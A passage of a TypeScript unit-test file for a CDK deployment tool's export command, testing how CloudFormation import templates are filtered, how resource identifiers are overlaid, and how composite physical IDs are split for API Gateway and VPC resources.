import { describe, it, expect, vi, beforeEach, afterEach } from 'vite-plus/test';
import { readAtKeyRegion } from '../_state-read-double.js';
import { STACK_REF_MAX_CODE_POINTS } from '../../../src/utils/display-safe.js';
import {
  applyImportOverlayForPhase2,
  buildCdkdStateStackTree,
  buildImportPlan,
  buildPerStackImportNodes,
  buildResolvedParametersPerStack,
  ssmParameterReader,
  cdkd2cfnStackName,
  orphanWithholdWhy,
  extractChildImportParameters,
  filterTemplateForImport,
  flattenCdkdStateTreeLeafFirst,
  flattenCdkdStateTreeRootFirst,
  resolveChildImportParameters,
  hasCompositeIdSplitter,
  injectDeletionPolicyForImport,
  injectRetainAndRewriteTemplateUrl,
  invokePreDeleteHandler,
  isImportUnsupportedRecreatableType,
  isNeverImportableType,
  isPhase2CreatableType,
  parseCfnChildStackNameOverrides,
  parseParameterOverrides,
  refuseTransientContextIfUnsafe,
  reportDriftBaselineGaps,
  resolveTemplateParameters,
  runPerStackImportLoop,
  scanCrossStackReferences,
  splitCompositePhysicalId,
  type CdkdStateStackTree,
} from '../../../src/cli/commands/export.js';
import { getLogger } from '../../../src/utils/logger.js';
import { PASTE_PAYLOADS, spansThatRun, withPasteDir } from '../utils/paste-harness.js';
import { SHELL_ACTIVE_WHY, shellQuote } from '../../../src/utils/pasteable-command.js';
import type { StackState } from '../../../src/types/state.js';
import type { S3StateBackend } from '../../../src/state/s3-state-backend.js';
import type { AwsClients } from '../../../src/utils/aws-clients.js';
import {
  IntrinsicFunctionResolver,
  type ResolverContext,
} from '../../../src/deployment/intrinsic-function-resolver.js';

describe('refuseTransientContextIfUnsafe', () => {
  it('passes through when no context overrides are supplied', () => {
    expect(() =>
      refuseTransientContextIfUnsafe({ acceptTransientContext: false })
    ).not.toThrow();
    expect(() =>
      refuseTransientContextIfUnsafe({ context: [], acceptTransientContext: false })
    ).not.toThrow();
  });

  it('refuses when CLI -c overrides are supplied without the escape hatch', () => {
    expect(() =>
      refuseTransientContextIfUnsafe({
        context: ['env=prod'],
        acceptTransientContext: false,
      })
    ).toThrow(/Refusing to export/);
  });

  it('includes every override in the refusal message', () => {
    let thrown: Error | undefined;
    try {
      refuseTransientContextIfUnsafe({
        context: ['env=prod', 'region=us-east-1'],
        acceptTransientContext: false,
      });
    } catch (err) {
      thrown = err as Error;
    }
    expect(thrown).toBeDefined();
    expect(thrown!.message).toContain("-c 'env=prod'");
    expect(thrown!.message).toContain("-c 'region=us-east-1'");
  });

  it('proceeds with --accept-transient-context (does not throw)', () => {
    expect(() =>
      refuseTransientContextIfUnsafe({
        context: ['env=prod'],
        acceptTransientContext: true,
      })
    ).not.toThrow();
  });
});

describe('isNeverImportableType', () => {
  it('flags AWS::CDK::Metadata', () => {
    expect(isNeverImportableType('AWS::CDK::Metadata')).toBe(true);
  });

  it('does NOT flag nested stacks (handled by dedicated branch in buildImportPlan, issue #464 PR B1)', () => {
    // Pre-PR-B1: AWS::CloudFormation::Stack was in NEVER_IMPORTABLE_TYPES so any
    // nested-stack-bearing export aborted at the "block" branch. PR B1 lifts the
    // entry and routes the row through a dedicated branch in `buildImportPlan`
    // that populates `nestedStackRows[]`. The CFn-side `--include-nested-stacks`
    // submission is tracked under PR B2; the orchestrator hard-errors with a
    // PR B2 pointer in the meantime.
    expect(isNeverImportableType('AWS::CloudFormation::Stack')).toBe(false);
  });

  it('flags every Custom::* type', () => {
    expect(isNeverImportableType('Custom::MyHandler')).toBe(true);
    expect(isNeverImportableType('Custom::SomethingElse')).toBe(true);
  });

  it('flags AWS::CloudFormation::CustomResource (untyped cdk.CustomResource)', () => {
    // CDK emits this type when `new cdk.CustomResource(...)` is constructed
    // without a `resourceType` property. AWS rejects it from IMPORT changesets
    // for the same reason it rejects Custom::*.
    expect(isNeverImportableType('AWS::CloudFormation::CustomResource')).toBe(true);
  });

  it('does NOT flag common importable types', () => {
    expect(isNeverImportableType('AWS::S3::Bucket')).toBe(false);
    expect(isNeverImportableType('AWS::IAM::Role')).toBe(false);
    expect(isNeverImportableType('AWS::Lambda::Function')).toBe(false);
    expect(isNeverImportableType('AWS::DynamoDB::Table')).toBe(false);
  });
});

describe('filterTemplateForImport', () => {
  it('keeps only resources in the plan', () => {
    const template = {
      AWSTemplateFormatVersion: '2010-09-09',
      Resources: {
        KeepMe: { Type: 'AWS::S3::Bucket', Properties: { BucketName: 'b' } },
        DropMe: { Type: 'AWS::CDK::Metadata', Properties: {} },
      },
    };
    const result = filterTemplateForImport(template, [
      { logicalId: 'KeepMe', resourceType: 'AWS::S3::Bucket', physicalId: 'b', resourceIdentifier: { BucketName: 'b' } },
    ]);
    expect(result['Resources']).toEqual({
      KeepMe: { Type: 'AWS::S3::Bucket', Properties: { BucketName: 'b' } },
    });
  });

  it('overlays ResourceIdentifier only on literal-string mismatch (pre-v0.94.0 prefix-on-user-declared-name legacy)', () => {
    // The pre-v0.94.0 default prefixed user-declared physical names with
    // the stack name: user wrote `roleName: 'user-declared-name'` in CDK
    // code; cdkd deploy created `'MyStack-user-declared-name'` on AWS.
    // ResourceIdentifier (from cdkd state's physicalId) carries the
    // prefixed value; Properties.RoleName (from synth) carries the
    // unprefixed value. CFn IMPORT's identifier-match check rejects the
    // changeset when these differ — overlay fixes the conflict.
    const template = {
      Resources: {
        Role: {
          Type: 'AWS::IAM::Role',
          Properties: {
            RoleName: 'user-declared-name',
            Description: 'unchanged',
          },
        },
      },
    };
    const result = filterTemplateForImport(template, [
      {
        logicalId: 'Role',
        resourceType: 'AWS::IAM::Role',
        physicalId: 'MyStack-user-declared-name',
        resourceIdentifier: { RoleName: 'MyStack-user-declared-name' },
      },
    ]);
    const role = (result['Resources'] as Record<string, Record<string, unknown>>)['Role']!;
    const properties = role['Properties'] as Record<string, unknown>;
    expect(properties['RoleName']).toBe('MyStack-user-declared-name');
    expect(properties['Description']).toBe('unchanged');
  });

  it('skips overlay when Properties.<NameField> is absent (auto-generated names — issue #319 fix)', () => {
    // The common case for cdkd-deployed stacks: user did NOT declare a
    // physical name in CDK code, so synth omits `Properties.RoleName`
    // entirely. Pre-#319, cdkd injected the cdkd-prefixed name into
    // Properties → post-export `cdk diff` saw `Properties.RoleName:
    // 'CdkSampleStack-...'` (CFn) vs `Properties.RoleName: <absent>`
    // (CDK synth) → proposed REPLACE on every auto-named resource,
    // defeating the "AWS resources unchanged across migration" promise.
    // Post-#319, the overlay is a no-op when the field is absent:
    // matches upstream `cdk import` behavior (Properties passed through,
    // ResourceIdentifier alone identifies the AWS resource).
    const template = {
      Resources: {
        Role: {
          Type: 'AWS::IAM::Role',
          Properties: {
            AssumeRolePolicyDocument: { Version: '2012-10-17', Statement: [] },
          },
        },
      },
    };
    const result = filterTemplateForImport(template, [
      {
        logicalId: 'Role',
        resourceType: 'AWS::IAM::Role',
        physicalId: 'CdkSampleStack-MyRoleF44D44CF',
        resourceIdentifier: { RoleName: 'CdkSampleStack-MyRoleF44D44CF' },
      },
    ]);
    const role = (result['Resources'] as Record<string, Record<string, unknown>>)['Role']!;
    const properties = role['Properties'] as Record<string, unknown>;
    expect(properties).not.toHaveProperty('RoleName');
    expect(properties['AssumeRolePolicyDocument']).toEqual({
      Version: '2012-10-17',
      Statement: [],
    });
  });

  it('skips overlay when Properties.<field> is an intrinsic (composite-id sub-resource — issue #319 fix)', () => {
    // For composite-id sub-resources (Integration / Route / Lambda::Permission /
    // ApiGateway::Method etc.), the parent's identifier is referenced via
    // intrinsic (`{Ref: 'ParentLogicalId'}` or `{Fn::GetAtt: [...]}`). Pre-#319,
    // cdkd overwrote the intrinsic with a literal value from
    // ResourceIdentifier → post-export `cdk diff` saw literal vs intrinsic
    // shape mismatch → proposed REPLACE on every composite sub-resource.
    // Post-#319, intrinsics are preserved (CFn resolves them during
    // changeset processing against the parent's ResourceIdentifier when
    // both are in the same IMPORT changeset).
    const template = {
      Resources: {
        Integration: {
          Type: 'AWS::ApiGatewayV2::Integration',
          Properties: { ApiId: { Ref: 'MyApi' }, IntegrationType: 'AWS_PROXY' },
        },
      },
    };
    const result = filterTemplateForImport(template, [
      {
        logicalId: 'Integration',
        resourceType: 'AWS::ApiGatewayV2::Integration',
        physicalId: 'integ-abc',
        resourceIdentifier: { ApiId: 'api-xyz', IntegrationId: 'integ-abc' },
        propertiesOverlay: { ApiId: 'api-xyz' },
      },
    ]);
    const integration = (result['Resources'] as Record<string, Record<string, unknown>>)[
      'Integration'
    ]!;
    const properties = integration['Properties'] as Record<string, unknown>;
    // Intrinsic preserved (NOT overwritten with literal 'api-xyz')
    expect(properties['ApiId']).toEqual({ Ref: 'MyApi' });
    // IntegrationId MUST NOT leak into Properties (would cause CFn rejection).
    expect(properties).not.toHaveProperty('IntegrationId');
    // Other Properties preserved.
    expect(properties['IntegrationType']).toBe('AWS_PROXY');
  });

  it('overlays composite identifier only on literal-string mismatch', () => {
    // Composite types where every identifier field happens to be a
    // literal-string mismatch in the synth template (rare in practice;
    // CDK normally emits intrinsics for parent-ref fields). All fields
    // get overwritten via the same literal-mismatch rule.
    const template = {
      Resources: {
        Method: {
          Type: 'AWS::ApiGateway::Method',
          Properties: { RestApiId: 'old', ResourceId: 'old', HttpMethod: 'old' },
        },
      },
    };
    const result = filterTemplateForImport(template, [
      {
        logicalId: 'Method',
        resourceType: 'AWS::ApiGateway::Method',
        physicalId: 'api123|res456|GET',
        resourceIdentifier: { RestApiId: 'api123', ResourceId: 'res456', HttpMethod: 'GET' },
      },
    ]);
    const method = (result['Resources'] as Record<string, Record<string, unknown>>)['Method']!;
    expect(method['Properties']).toEqual({
      RestApiId: 'api123',
      ResourceId: 'res456',
      HttpMethod: 'GET',
    });
  });

  it('creates a Properties object on resources that had none (still skips overlay since field is absent)', () => {
    // Edge case: resource with no Properties section at all. We still
    // produce an empty Properties object for downstream consistency, but
    // we do NOT inject the overlay fields — same auto-gen-name case as
    // the "absent" test above. Pre-#319 this case injected the cdkd
    // identifier and caused REPLACE on first cdk deploy.
    const template = {
      Resources: { Bare: { Type: 'AWS::S3::Bucket' } },
    };
    const result = filterTemplateForImport(template, [
      { logicalId: 'Bare', resourceType: 'AWS::S3::Bucket', physicalId: 'b', resourceIdentifier: { BucketName: 'b' } },
    ]);
    expect((result['Resources'] as Record<string, Record<string, unknown>>)['Bare']!['Properties']).toEqual({});
  });

  it('preserves top-level keys other than Resources/Outputs', () => {
    const template = {
      AWSTemplateFormatVersion: '2010-09-09',
      Description: 'test',
      Parameters: { P: { Type: 'String' } },
      Resources: {
        A: { Type: 'AWS::S3::Bucket' },
      },
    };
    const result = filterTemplateForImport(template, [
      { logicalId: 'A', resourceType: 'AWS::S3::Bucket', physicalId: 'b', resourceIdentifier: { BucketName: 'b' } },
    ]);
    expect(result['AWSTemplateFormatVersion']).toBe('2010-09-09');
    expect(result['Description']).toBe('test');
    expect(result['Parameters']).toEqual({ P: { Type: 'String' } });
  });

  it('strips Outputs entirely (CFn IMPORT changeset rejects any Outputs)', () => {
    // CloudFormation IMPORT rejects the changeset with "As part of the
    // import operation, you cannot modify or add [Outputs]", regardless
    // of whether the Outputs reference imported or excluded resources.
    // Phase 2 UPDATE re-submits the full synth template and restores
    // Outputs along with the non-importable resources.
    const template = {
      Resources: {
        Keep: { Type: 'AWS::S3::Bucket' },
        Drop: { Type: 'Custom::Foo' },
      },
      Outputs: {
        // Even an Output that only references the imported resource
        // must be stripped — AWS rejects ANY Outputs on IMPORT.
        KeepOut: { Value: { Ref: 'Keep' } },
        DropOut: { Value: { Ref: 'Drop' } },
      },
    };
    const result = filterTemplateForImport(template, [
      { logicalId: 'Keep', resourceType: 'AWS::S3::Bucket', physicalId: 'b', resourceIdentifier: { BucketName: 'b' } },
    ]);
    expect('Outputs' in result).toBe(false);
  });

  it('strips Outputs even when none reference any resource', () => {
    const template = {
      Resources: { Keep: { Type: 'AWS::S3::Bucket' } },
      Outputs: { StaticOut: { Value: 'plain-string' } },
    };
    const result = filterTemplateForImport(template, [
      { logicalId: 'Keep', resourceType: 'AWS::S3::Bucket', physicalId: 'b', resourceIdentifier: { BucketName: 'b' } },
    ]);
    expect('Outputs' in result).toBe(false);
  });

  it('leaves the result without an Outputs key when template has none', () => {
    const template = {
      Resources: { Keep: { Type: 'AWS::S3::Bucket' } },
    };
    const result = filterTemplateForImport(template, [
      { logicalId: 'Keep', resourceType: 'AWS::S3::Bucket', physicalId: 'b', resourceIdentifier: { BucketName: 'b' } },
    ]);
    expect('Outputs' in result).toBe(false);
  });
});

describe('applyImportOverlayForPhase2', () => {
  // Phase 1 and phase 2 must apply the SAME overlay rule to avoid CFn
  // seeing a "property changed" diff between the IMPORT'd state and the
  // phase-2 UPDATE template (which would silently REPLACE every imported
  // resource whose property is immutable — see PR #316). As of #319 the
  // overlay is conditional (only fires on literal-string mismatch), and
  // since both phases call `overlayResourceIdentifierOnProperties`, the
  // symmetry holds.

  it('skips overlay on auto-gen names (Properties.<field> absent — issue #319 fix)', () => {
    // CDK did not set RoleName; synth has no RoleName on the resource.
    // Phase-2 template MUST NOT inject it either, so the post-export
    // CFn-managed template matches what CDK synth would produce on a
    // future `cdk deploy` (= no Properties.RoleName) and `cdk diff`
    // shows no change.
    const synth = {
      Resources: {
        Role: {
          Type: 'AWS::IAM::Role',
          Properties: {
            AssumeRolePolicyDocument: { Version: '2012-10-17', Statement: [] },
          },
        },
      },
    };
    const result = applyImportOverlayForPhase2(synth, [
      {
        logicalId: 'Role',
        resourceType: 'AWS::IAM::Role',
        physicalId: 'CdkSampleStack-Role',
        resourceIdentifier: { RoleName: 'CdkSampleStack-Role' },
      },
    ]);
    const role = (result['Resources'] as Record<string, Record<string, unknown>>)['Role']!;
    const properties = role['Properties'] as Record<string, unknown>;
    expect(properties).not.toHaveProperty('RoleName');
    // Existing Properties preserved
    expect(properties['AssumeRolePolicyDocument']).toEqual({
      Version: '2012-10-17',
      Statement: [],
    });
  });

  it('overlays on literal-string mismatch (pre-v0.94.0 prefix-on-user-declared-name legacy)', () => {
    // User declared `roleName: 'foo'` in CDK code; cdkd's pre-v0.94.0
    // default prefixed it to `'MyStack-foo'` on AWS. Phase-2 needs the
    // same overlay phase-1 used to keep CFn from seeing a diff between
    // IMPORT'd state ('MyStack-foo') and phase-2 raw synth ('foo').
    const synth = {
      Resources: {
        Role: {
          Type: 'AWS::IAM::Role',
          Properties: { RoleName: 'foo' },
        },
      },
    };
    const result = applyImportOverlayForPhase2(synth, [
      {
        logicalId: 'Role',
        resourceType: 'AWS::IAM::Role',
        physicalId: 'MyStack-foo',
        resourceIdentifier: { RoleName: 'MyStack-foo' },
      },
    ]);
    const role = (result['Resources'] as Record<string, Record<string, unknown>>)['Role']!;
    expect((role['Properties'] as Record<string, unknown>)['RoleName']).toBe('MyStack-foo');
  });

  it('does NOT touch resources outside phase1Imports (phase-2 CREATE / recreate stay raw)', () => {
    // Custom Resources go through phase-2 CREATE from raw synth; recreate-
    // before-phase-2 entries (IAM::Policy) are deleted from AWS
    // and CFn re-CREATEs from raw synth. Neither should have overlay
    // applied — they have no "phase-1 import'd state" to keep consistent.
    const synth = {
      Resources: {
        Role: {
          Type: 'AWS::IAM::Role',
          Properties: { RoleName: 'foo' },
        },
        CR: {
          Type: 'Custom::S3AutoDeleteObjects',
          Properties: { ServiceToken: 'arn:...' },
        },
        Policy: {
          Type: 'AWS::IAM::Policy',
          Properties: { PolicyName: 'p', Roles: [{ Ref: 'Role' }] },
        },
      },
    };
    const result = applyImportOverlayForPhase2(synth, [
      {
        logicalId: 'Role',
        resourceType: 'AWS::IAM::Role',
        physicalId: 'MyStack-foo',
        resourceIdentifier: { RoleName: 'MyStack-foo' },
      },
      // CR and Policy are NOT in phase1Imports
    ]);
    const resources = result['Resources'] as Record<string, Record<string, unknown>>;
    expect((resources['Role']!['Properties'] as Record<string, unknown>)['RoleName']).toBe(
      'MyStack-foo'
    );
    expect(resources['CR']!['Properties']).toEqual({ ServiceToken: 'arn:...' });
    expect(resources['Policy']!['Properties']).toEqual({
      PolicyName: 'p',
      Roles: [{ Ref: 'Role' }],
    });
  });

  it('preserves intrinsic Properties.<field> (composite-id sub-resources — issue #319 fix)', () => {
    // Composite-id sub-resources reference their parent via intrinsic in
    // synth template. Phase-2 overlay MUST NOT overwrite the intrinsic
    // with a literal value — that would create a literal-vs-intrinsic
    // shape mismatch on next `cdk synth` → REPLACE on next `cdk deploy`.
    const synth = {
      Resources: {
        Integ: {
          Type: 'AWS::ApiGatewayV2::Integration',
          Properties: { ApiId: { Ref: 'Api' }, IntegrationType: 'AWS_PROXY' },
        },
      },
    };
    const result = applyImportOverlayForPhase2(synth, [
      {
        logicalId: 'Integ',
        resourceType: 'AWS::ApiGatewayV2::Integration',
        physicalId: 'integ-abc',
        resourceIdentifier: { ApiId: 'api-xyz', IntegrationId: 'integ-abc' },
        propertiesOverlay: { ApiId: 'api-xyz' },
      },
    ]);
    const integ = (result['Resources'] as Record<string, Record<string, unknown>>)['Integ']!;
    const properties = integ['Properties'] as Record<string, unknown>;
    // Intrinsic preserved (NOT overwritten with 'api-xyz')
    expect(properties['ApiId']).toEqual({ Ref: 'Api' });
    expect(properties).not.toHaveProperty('IntegrationId');
    expect(properties['IntegrationType']).toBe('AWS_PROXY');
  });

  it('deep-clones the input so the caller can still use the raw synth template', () => {
    // The phase-1 code path also reads from the same synth template
    // (filterTemplateForImport runs separately). Mutating the input
    // here would cross-contaminate.
    const synth = {
      Resources: {
        Role: { Type: 'AWS::IAM::Role', Properties: {} },
      },
    };
    applyImportOverlayForPhase2(synth, [
      {
        logicalId: 'Role',
        resourceType: 'AWS::IAM::Role',
        physicalId: 'CdkSampleStack-Role',
        resourceIdentifier: { RoleName: 'CdkSampleStack-Role' },
      },
    ]);
    // Original input untouched
    expect((synth.Resources.Role as { Properties: Record<string, unknown> }).Properties).toEqual(
      {}
    );
  });

  it('preserves Outputs (unlike filterTemplateForImport which strips them)', () => {
    // Phase-2 UPDATE template restores Outputs that phase-1 had to strip
    // (CFn IMPORT rejects Outputs). The overlay function must leave them
    // alone.
    const synth = {
      Resources: {
        Role: { Type: 'AWS::IAM::Role', Properties: {} },
      },
      Outputs: {
        RoleArn: { Value: { 'Fn::GetAtt': ['Role', 'Arn'] } },
      },
    };
    const result = applyImportOverlayForPhase2(synth, [
      {
        logicalId: 'Role',
        resourceType: 'AWS::IAM::Role',
        physicalId: 'CdkSampleStack-Role',
        resourceIdentifier: { RoleName: 'CdkSampleStack-Role' },
      },
    ]);
    expect(result['Outputs']).toEqual({
      RoleArn: { Value: { 'Fn::GetAtt': ['Role', 'Arn'] } },
    });
  });

  it('handles template without Resources section gracefully', () => {
    // Defensive: cdkd's executeUpdateChangeSet call site already ensures
    // a Resources section exists, but tolerate the empty case to keep
    // the helper composable.
    const result = applyImportOverlayForPhase2({}, []);
    expect(result).toEqual({});
  });

  it('skips imports whose logicalId is missing from the template (defensive)', () => {
    // Edge case: cdkd state has a resource not in the current synth
    // (e.g. user removed it from CDK code). buildImportPlan would have
    // flagged this earlier, but the overlay helper itself must not crash.
    const synth = {
      Resources: { Role: { Type: 'AWS::IAM::Role', Properties: {} } },
    };
    const result = applyImportOverlayForPhase2(synth, [
      {
        logicalId: 'Role',
        resourceType: 'AWS::IAM::Role',
        physicalId: 'r',
        resourceIdentifier: { RoleName: 'r' },
      },
      {
        logicalId: 'MissingFromTemplate',
        resourceType: 'AWS::SNS::Topic',
        physicalId: 't',
        resourceIdentifier: { TopicArn: 't' },
      },
    ]);
    const resources = result['Resources'] as Record<string, Record<string, unknown>>;
    expect(resources).toHaveProperty('Role');
    expect(resources).not.toHaveProperty('MissingFromTemplate');
  });
});

describe('hasCompositeIdSplitter', () => {
  it('reports the registered composite types', () => {
    expect(hasCompositeIdSplitter('AWS::ApiGateway::Method')).toBe(true);
    expect(hasCompositeIdSplitter('AWS::ApiGateway::Resource')).toBe(true);
    expect(hasCompositeIdSplitter('AWS::EC2::VPCGatewayAttachment')).toBe(true);
    // Issue #1692: every AWS::ApiGateway::* child with a composite identifier.
    expect(hasCompositeIdSplitter('AWS::ApiGateway::Deployment')).toBe(true);
    expect(hasCompositeIdSplitter('AWS::ApiGateway::Stage')).toBe(true);
    expect(hasCompositeIdSplitter('AWS::ApiGateway::Authorizer')).toBe(true);
    expect(hasCompositeIdSplitter('AWS::ApiGateway::Model')).toBe(true);
    expect(hasCompositeIdSplitter('AWS::ApiGateway::RequestValidator')).toBe(true);
    expect(hasCompositeIdSplitter('AWS::ApiGatewayV2::Integration')).toBe(true);
    expect(hasCompositeIdSplitter('AWS::ApiGatewayV2::Route')).toBe(true);
    expect(hasCompositeIdSplitter('AWS::Lambda::Permission')).toBe(true);
    // Issue #3414: composite `[ApiId, ApiKeyId]` since AWS's 2026-09 re-publish.
    expect(hasCompositeIdSplitter('AWS::AppSync::ApiKey')).toBe(true);
    // Issue #1772: `[ApiId, StageName]`, imported now that CFn accepts it.
    expect(hasCompositeIdSplitter('AWS::ApiGatewayV2::Stage')).toBe(true);
  });

  it('returns false for single-key types', () => {
    expect(hasCompositeIdSplitter('AWS::S3::Bucket')).toBe(false);
    expect(hasCompositeIdSplitter('AWS::Lambda::Function')).toBe(false);
  });

  it('returns false for unknown / unregistered types', () => {
    expect(hasCompositeIdSplitter('AWS::Made::Up::Type')).toBe(false);
  });
});

describe('splitCompositePhysicalId', () => {
  it('parses AWS::ApiGateway::Method (restApiId|resourceId|httpMethod)', () => {
    expect(splitCompositePhysicalId('AWS::ApiGateway::Method', 'api123|res456|GET')).toEqual({
      resourceIdentifier: { RestApiId: 'api123', ResourceId: 'res456', HttpMethod: 'GET' },
    });
  });

  it('parses AWS::ApiGateway::Resource legacy composite (restApiId|resourceId)', () => {
    // The Cloud Control path produced this shape; state written by it must
    // still export. `ResourceId` is read-only, so the overlay narrows to
    // RestApiId (issue #1663).
    expect(splitCompositePhysicalId('AWS::ApiGateway::Resource', 'api123|res456')).toEqual({
      resourceIdentifier: { RestApiId: 'api123', ResourceId: 'res456' },
      propertiesOverlay: { RestApiId: 'api123' },
    });
  });

  it('parses AWS::ApiGateway::Resource BARE resourceId, taking RestApiId from state (#1663)', () => {
    // What the SDK provider's createResource() actually stores.
    expect(
      splitCompositePhysicalId('AWS::ApiGateway::Resource', 'res456', { RestApiId: 'api123' })
    ).toEqual({
      resourceIdentifier: { RestApiId: 'api123', ResourceId: 'res456' },
      propertiesOverlay: { RestApiId: 'api123' },
    });
  });

  it('never writes the read-only ResourceId into Properties (#1663)', () => {
    // propertiesOverlay defaults to the whole resourceIdentifier map, so an
    // absent overlay here would hand CFn a read-only property and the IMPORT
    // changeset would be rejected.
    for (const id of ['res456', 'api123|res456']) {
      const result = splitCompositePhysicalId('AWS::ApiGateway::Resource', id, {
        RestApiId: 'api123',
      });
      expect(result.propertiesOverlay).toBeDefined();
      expect(result.propertiesOverlay).not.toHaveProperty('ResourceId');
    }
  });

  it('reports a corrupt state entry when the bare form has no RestApiId in properties', () => {
    expect(() => splitCompositePhysicalId('AWS::ApiGateway::Resource', 'res456', {})).toThrow(
      /missing 'RestApiId'/
    );
  });

  // Issue #1691: the CFn identifier is [AttachmentType, VpcId] with
  // AttachmentType read-only (live DescribeType, us-east-1, 2026-08-12) — the
  // pre-fix {VpcId, InternetGatewayId} map made resolveCompositeId's field
  // check throw and aborted `cdkd export` on every VPC + IGW stack.
  //
  // The VALUES below were `InternetGateway` / `VPN` until issue #1771 measured
  // them: they are `IGW` / `VGW` (Cloud Control ListResources, us-east-1,
  // 2026-08-13, against a VPC carrying both attachment kinds), and CFn rejects
  // the spelled-out guesses with `Invalid Attachment Type 'InternetGateway'` at
  // changeset-create. The registry schema types the field as a bare string and
  // enumerates nothing, so only a live measurement settles it.
  it('derives AttachmentType for AWS::EC2::VPCGatewayAttachment (IGW, narrow overlay)', () => {
    expect(
      splitCompositePhysicalId('AWS::EC2::VPCGatewayAttachment', 'igw-abc|vpc-xyz', {
        VpcId: 'vpc-xyz',
        InternetGatewayId: 'igw-abc',
      })
    ).toEqual({
      resourceIdentifier: { AttachmentType: 'IGW', VpcId: 'vpc-xyz' },
      propertiesOverlay: { VpcId: 'vpc-xyz' },
    });
  });

  it('derives AttachmentType VGW when the recorded properties carry VpnGatewayId', () => {
    expect(
      splitCompositePhysicalId('AWS::EC2::VPCGatewayAttachment', 'vgw-abc|vpc-xyz', {
        VpcId: 'vpc-xyz',
        VpnGatewayId: 'vgw-abc',
      })
    ).toEqual({
      resourceIdentifier: { AttachmentType: 'VGW', VpcId: 'vpc-xyz' },
      propertiesOverlay: { VpcId: 'vpc-xyz' },
    });
  });

  it('accepts the Cloud-Control-written AttachmentType|VpcId shape verbatim', () => {
    // A template declaring VpnGatewayId trips the #614 silent-drop routing, so
    // Cloud Control stores the CFn primaryIdentifier joined.
    expect(
      splitCompositePhysicalId('AWS::EC2::VPCGatewayAttachment', 'VGW|vpc-xyz', {})
    ).toEqual({
      resourceIdentifier: { AttachmentType: 'VGW', VpcId: 'vpc-xyz' },
      propertiesOverlay: { VpcId: 'vpc-xyz' },
    });
  });

  it('normalizes a state record carrying the pre-#1771 spelled-out AttachmentType', () => {
    // State written by an older cdkd through the Cloud Control path stores the
    // primaryIdentifier verbatim, so a record could carry either spelling. The
    // CFn-invalid one is accepted as INPUT and normalized rather than passed
    // through — passing it through is exactly what CFn rejected.
    for (const [stored, expected] of [
      ['InternetGateway', 'IGW'],
      ['VPN', 'VGW'],
    ] as const) {
      expect(
        splitCompositePhysicalId('AWS::EC2::VPCGatewayAttachment', `${stored}|vpc-xyz`, {})
      ).toEqual({
        resourceIdentifier: { AttachmentType: expected, VpcId: 'vpc-xyz' },
        propertiesOverlay: { VpcId: 'vpc-xyz' },
      });
    }
  });

  it('falls back to the gateway-id prefix when properties carry neither gateway id', () => {
    // BOTH prefixes: the `vgw-` arm was the last unreached branch in
    // resolveGatewayAttachmentType — its only other test also supplies
    // VpnGatewayId, which is matched one branch earlier, so mutating this arm
    // to the wrong value survived the whole suite.
    expect(
      splitCompositePhysicalId('AWS::EC2::VPCGatewayAttachment', 'igw-abc|vpc-xyz', {})
    ).toEqual({
      resourceIdentifier: { AttachmentType: 'IGW', VpcId: 'vpc-xyz' },
      propertiesOverlay: { VpcId: 'vpc-xyz' },
    });
    expect(
      splitCompositePhysicalId('AWS::EC2::VPCGatewayAttachment', 'vgw-abc|vpc-xyz', {})
    ).toEqual({
      resourceIdentifier: { AttachmentType: 'VGW', VpcId: 'vpc-xyz' },
      propertiesOverlay: { VpcId: 'vpc-xyz' },
    });
  });

  it('does not resolve an inherited Object.prototype member as an AttachmentType', () => {
    // A bare index into an object literal answers for `constructor` /
    // `toString` / `valueOf` too, so a physical id whose first segment is one
    // of those would resolve to a FUNCTION instead of falling through to the
    // property-derivation arms. The lookup uses Object.hasOwn for this reason.
    expect(
      splitCompositePhysicalId('AWS::EC2::VPCGatewayAttachment', 'constructor|vpc-xyz', {
        InternetGatewayId: 'igw-abc',
      })
    ).toEqual({
      resourceIdentifier: { AttachmentType: 'IGW', VpcId: 'vpc-xyz' },
      propertiesOverlay: { VpcId: 'vpc-xyz' },
    });
    // With nothing to derive from, it must REFUSE rather than ship a function.
    expect(() =>
      splitCompositePhysicalId('AWS::EC2::VPCGatewayAttachment', 'toString|vpc-xyz', {})
    ).toThrow(/cannot determine AttachmentType/);
  });

  it('throws when AttachmentType cannot be determined for VPCGatewayAttachment', () => {
    expect(() =>
      splitCompositePhysicalId('AWS::EC2::VPCGatewayAttachment', 'mystery-abc|vpc-xyz', {})
    ).toThrow(/cannot determine AttachmentType/);
  });

  // Issue #1692: every CDK RestApi emits a Deployment AND a Stage, so without
  // these splitters `cdkd export` aborted on any REST v1 stack.
  it('parses AWS::ApiGateway::Deployment from the bare SDK id (narrow overlay)', () => {
    expect(
      splitCompositePhysicalId('AWS::ApiGateway::Deployment', 'dep123', {
        RestApiId: 'api-xyz',
      })
    ).toEqual({
      resourceIdentifier: { RestApiId: 'api-xyz', DeploymentId: 'dep123' },
      propertiesOverlay: { RestApiId: 'api-xyz' },
    });
  });

  it('parses AWS::ApiGateway::Deployment from the CC composite (child id FIRST)', () => {
    // CFn primaryIdentifier is [DeploymentId, RestApiId], so Cloud Control
    // joins the child id ahead of the parent — unlike every sibling type.
    expect(splitCompositePhysicalId('AWS::ApiGateway::Deployment', 'dep123|api-xyz', {})).toEqual({
      resourceIdentifier: { RestApiId: 'api-xyz', DeploymentId: 'dep123' },
      propertiesOverlay: { RestApiId: 'api-xyz' },
    });
  });

  it('parses AWS::ApiGateway::Stage with the default overlay (no read-only fields)', () => {
    expect(
      splitCompositePhysicalId('AWS::ApiGateway::Stage', 'prod', { RestApiId: 'api-xyz' })
    ).toEqual({
      resourceIdentifier: { RestApiId: 'api-xyz', StageName: 'prod' },
    });
  });

  it('parses AWS::ApiGateway::Stage from the CC composite (parent id first)', () => {
    expect(splitCompositePhysicalId('AWS::ApiGateway::Stage', 'api-xyz|prod', {})).toEqual({
      resourceIdentifier: { RestApiId: 'api-xyz', StageName: 'prod' },
    });
  });

  it('parses AWS::ApiGateway::Authorizer (narrow overlay)', () => {
    expect(
      splitCompositePhysicalId('AWS::ApiGateway::Authorizer', 'auth123', {
        RestApiId: 'api-xyz',
      })
    ).toEqual({
      resourceIdentifier: { RestApiId: 'api-xyz', AuthorizerId: 'auth123' },
      propertiesOverlay: { RestApiId: 'api-xyz' },
    });
  });

  it('parses AWS::ApiGateway::Model with the default overlay', () => {
    expect(splitCompositePhysicalId('AWS::ApiGateway::Model', 'api-xyz|MyModel', {})).toEqual({
      resourceIdentifier: { RestApiId: 'api-xyz', Name: 'MyModel' },
    });
  });

  it('parses AWS::ApiGateway::RequestValidator (narrow overlay)', () => {
